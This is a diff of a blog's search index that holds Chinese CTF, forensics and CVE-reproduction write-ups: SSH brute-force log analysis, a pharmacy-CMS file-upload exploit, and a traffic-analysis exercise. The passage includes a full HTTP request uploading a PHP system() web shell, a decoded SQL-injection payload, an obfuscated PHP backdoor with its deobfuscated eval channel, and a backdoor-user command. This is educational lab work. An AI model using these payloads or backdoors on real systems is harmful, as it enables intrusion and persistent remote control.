@@ -1,83 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Brutus-HackTheBox</title>
-    <url>/article/Brutus-HackTheBox.html</url>
-    <content><![CDATA[<p>wtmp日志文件</p>
-<span id="more"></span>
-
-
-
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
-<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
-</blockquote>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
-<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
-<p>我们在对成功登录的日志记录下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
-
-<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
-<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
-<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
-<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
-<blockquote>
-<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
-</blockquote>
-<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
-<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
-<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
-<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
-<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
-<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
-<p>善于使用搜索引擎</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
-<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>
-
-<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
-<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>日志分析</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2022-30887</title>
-    <url>/article/CVE-2022-30887.html</url>
-    <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
-<span id="more"></span>
-
-<h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><p>打开题目，利用社工手段得到用户密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">password：mayurik</span><br></pre></td></tr></table></figure>
-
-<p>登陆成功后找到文件上传点</p>
-<p><img src="/article/CVE-2022-30887/image-20240413113616413.png"></p>
-<p>不过这里的洞被修复了，然后找到我们可以修改存在的药品图片</p>
-<p><img src="/article/CVE-2022-30887/image-20240413123550782.png"></p>
-<p>发包即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>春秋云镜</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Bumblebee-HackTheBox</title>
     <url>/article/Bumblebee-HackTheBox.html</url>
     <content><![CDATA[<p>对sqlite3数据库文件进行日志分析</p>
@@ -160,6 +83,105 @@
       </tags>
   </entry>
   <entry>
+    <title>2018信息安全铁人三项数据赛</title>
+    <url>/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html</url>
+    <content><![CDATA[<p>记录一些铁三的流量分析题</p>
+<span id="more"></span>
+
+
+
+<h1 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h1><p><strong>题目要求：</strong><br><strong>1.黑客攻击的第一个受害主机的网卡IP地址</strong><br><strong>2.黑客对URL的哪一个参数实施了SQL注入</strong><br><strong>3.第一个受害主机网站数据库的表前缀（加上下划线例如abc_）</strong><br><strong>4.第一个受害主机网站数据库的名字</strong></p>
+<p>我们直接查看http流，注意到ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>不断地发包</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423212801277.png"></p>
+<p>所以受害主机ip为<code>192.168.1.8</code></p>
+<p>我们筛选一下源ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==202.1.1.2</span><br></pre></td></tr></table></figure>
+
+<p>在分组列表往下翻注意到使用sqlmap进行注入攻击，追踪tcp流</p>
+<p>得到注入参数为<code>list[select]</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423213600211.png"></p>
+<p>我们在195流注意到响应包泄露了数据表名称前缀为<code>ajtuc</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423214201938.png"></p>
+<p>或者我们找到最后一次注入的payload，解码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list[select]=(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),4235))</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名称为<code>joomla</code></p>
+<h1 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h1><p><strong>题目要求：<br>1.黑客第一次获得的php木马的密码是什么<br>2.黑客第二次上传php木马是什么时间<br>3.第二次上传的木马通过HTTP协议中的哪个头传递数据</strong></p>
+<p>题目一已经锁定了目标ip信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>筛选一下注意到<code>/kkkaaa.php</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423221618117.png"></p>
+<p>追踪tcp流得到参数为zzz</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423223256000.png"></p>
+<p>获取第二个木马时间就要看POST请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意到下面这个包有参数<code>z2</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423230356685.png"></p>
+<p>我们将十六进制数据解码一下得到php代码（美化一下）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p=&#x27;l&gt;]ower&quot;;$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5&#x27;;</span><br><span class="line">$d=&#x27;]q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll(&quot;/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/&quot;,&gt;&#x27;;</span><br><span class="line">$W=&#x27;),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base&#x27;;</span><br><span class="line">$e=&#x27;]T_LANGUAGE&quot;];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u[&quot;&gt;]query&quot;],$&gt;]q);$&gt;&#x27;;</span><br><span class="line">$E=&#x27;&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt(&quot;&lt;$k&gt;$d&lt;&gt;]/$k&gt;&quot;&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;&#x27;;</span><br><span class="line">$t=&#x27;($i.&gt;]$kf),0,3&gt;]));$p&gt;]=&quot;&quot;;fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;&#x27;;</span><br><span class="line">$M=&#x27;]$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s=&quot;substr&quot;;$sl=&quot;s&gt;]&gt;]trto&#x27;;</span><br><span class="line">$P=&#x27;]f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]=&quot;&quot;;$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;&#x27;;</span><br><span class="line">$j=str_replace(&#x27;fr&#x27;,&#x27;&#x27;,&#x27;cfrrfreatfrfre_funcfrtfrion&#x27;);</span><br><span class="line">$k=&#x27;];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]&quot;HTTP&gt;]_REFERE&gt;]R&quot;];$ra&gt;]=@&gt;]$r[&quot;&gt;]HTTP_A&gt;]CC&gt;]EP&gt;&#x27;;</span><br><span class="line">$g=&#x27;&quot;&quot;;for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;&#x27;;</span><br><span class="line">$R=&#x27;$k&gt;]h=&quot;cb4&gt;]2&quot;;$kf=&quot;e130&quot;&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o=&#x27;;</span><br><span class="line">$Q=&#x27;]s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;&#x27;;</span><br><span class="line">$v=&#x27;]mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array(&quot;/_/&quot;,&quot;/-/&quot;),arr&gt;]ay(&gt;]&quot;/&quot;,&quot;+&quot;&gt;]&#x27;;</span><br><span class="line">$x=str_replace(&#x27;&gt;]&#x27;,&#x27;&#x27;,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="line">$N=$j(&#x27;&#x27;,$x);</span><br><span class="line">$N();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很明显是代码混淆过的，注意变量j和x，应该是可以把代码变回去</p>
+<p>在结尾添加即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure>
+
+<p>发现有eval出现，说明此包为第二次上传木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$kh = &quot;cb42&quot;;</span><br><span class="line">$kf = &quot;e130&quot;;</span><br><span class="line">function x($t, $k)</span><br><span class="line">&#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br><span class="line">if ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);</span><br><span class="line">    parse_str($u[&quot;query&quot;], $q);</span><br><span class="line">    $q = array_values($q);</span><br><span class="line">    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);</span><br><span class="line">    if ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s =&amp; $_SESSION;</span><br><span class="line">        $ss = &quot;substr&quot;;</span><br><span class="line">        $sl = &quot;strtolower&quot;;</span><br><span class="line">        $i = $m[1][0] . $m[1][4];</span><br><span class="line">        $h = $sl($ss(md5($i . $kh), 0, 3));</span><br><span class="line">        $f = $sl($ss(md5($i . $kf), 0, 3));</span><br><span class="line">        $p = &quot;&quot;;</span><br><span class="line">        for ($z = 1; $z &lt; count($m[1]); $z++) $p .= $q[$m[2][$z]];</span><br><span class="line">        if (strpos($p, $h) === 0) &#123;</span><br><span class="line">            $s[$i] = &quot;&quot;;</span><br><span class="line">            $p = $ss($p, 3);</span><br><span class="line">        &#125;</span><br><span class="line">        if (array_key_exists($i, $s)) &#123;</span><br><span class="line">            $s[$i] .= $p;</span><br><span class="line">            $e = strpos($s[$i], $f);</span><br><span class="line">            if ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;, &quot;/-/&quot;), array(&quot;/&quot;, &quot;+&quot;), $ss($s[$i], 0, $e))), $k)));</span><br><span class="line">                $o = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d = base64_encode(x(gzcompress($o), $k));</span><br><span class="line">                print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功找到时间</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231540280.png"></p>
+<p>上面的木马中注意到有两个http头，肯定是其中一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure>
+
+<p>我们追踪tcp流看一下，注意到footer.php文件</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231742123.png"></p>
+<p>查看一下，发现referer头存在数据传递</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231918800.png"></p>
+<h1 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h1><p><strong>题目要求：<br>1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br>2.php代理第一次被使用时最先连接了哪个IP地址</strong></p>
+<p>筛选http并没有收获，所以看下tcp流</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp &amp;&amp; tcp contains &quot;mysql&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意到请求长度为151的是攻击者对admin用户进行爆破，我们直接看最后一次password的hash值</p>
+<p>得到答案<code>admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220800333.png"></p>
+<p>为了找出连接哪个IP，我们筛选下POST请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到第一次连接的ip为<code>4.2.2.2</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220929490.png"></p>
+<h1 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h1><p><strong>题目要求：<br>1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br>2.黑客在内网主机中添加的用户名和密码是多少<br>3.黑客从内网服务器中下载下来的文件名</strong></p>
+<p>找下出现列出文件列表的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;system&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>可以发现有ls和dir，后经验证是dir</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424234829936.png"></p>
+<p>我们看下响应包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.src == 192.168.2.20 &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>翻了一会找到<code>NET USER</code>命令</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235537584.png"></p>
+<p>继续往下翻找到添加用户为kaka</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235818984.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18:49:27.767754时，不存在kaka用户</span><br><span class="line">18:50:42.908737时，kaka用户已成为管理员</span><br></pre></td></tr></table></figure>
+
+<p>所以可以断定作案时间点在这段时间内，找到后解密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240425000833804.png"></p>
+<p>既然是下载，应该是利用中国菜刀进行下载了，那我们只过滤出post流量，查看命令即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.2.20 &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>
+
+<p>查看最后一个解码得到<code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code></p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+      <tags>
+        <tag>铁人三项</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2022-28512</title>
     <url>/article/CVE-2022-28512.html</url>
     <content><![CDATA[<p>Fantastic Blog (CMS)是一个博客&#x2F;文章网络内容管理系统。该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞</p>
@@ -183,6 +205,74 @@
       </categories>
   </entry>
   <entry>
+    <title>Brutus-HackTheBox</title>
+    <url>/article/Brutus-HackTheBox.html</url>
+    <content><![CDATA[<p>wtmp日志文件</p>
+<span id="more"></span>
+
+
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
+</blockquote>
+<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
+<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
+<p>我们在对成功登录的日志记录下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
+
+<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
+<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
+<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
+<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
+<blockquote>
+<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
+</blockquote>
+<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
+<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
+<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
